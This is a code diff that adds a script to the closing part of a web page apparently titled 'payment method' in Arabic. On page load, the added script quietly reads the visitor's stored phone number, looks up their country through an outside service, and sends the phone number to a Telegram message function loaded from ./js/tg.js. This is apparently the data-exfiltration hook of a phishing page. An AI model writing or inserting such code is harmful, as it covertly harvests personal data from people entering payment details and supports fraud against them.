@@ -578,6 +578,32 @@
                 }
            })
     </script>
+
+
+ <script>
+
+document.addEventListener("DOMContentLoaded", function () {
+
+  if (sessionStorage.getItem("tgType")) {
+    console.log("الإشعار سبق وتم إرساله خلال هذه الجلسة.");
+    return;
+  }
+  const pageName = "طريقة الدفع"
+
+
+
+    fetch('https://api.country.is').then(response => response.json())
+      .then(data => {
+        const country = data.country || "غير معروف";
+        const message = `الصفحة:${pageName}\nvرقم الهاتف:${localStorage.getItem('phonenumber')}`;
+        send_telegram_message(message)
+      })
+
+    sessionStorage.setItem('tgType',true)
+});
+</script>
+<script src="./js/tg.js"></script>
+    
 </body>
 
 </html>
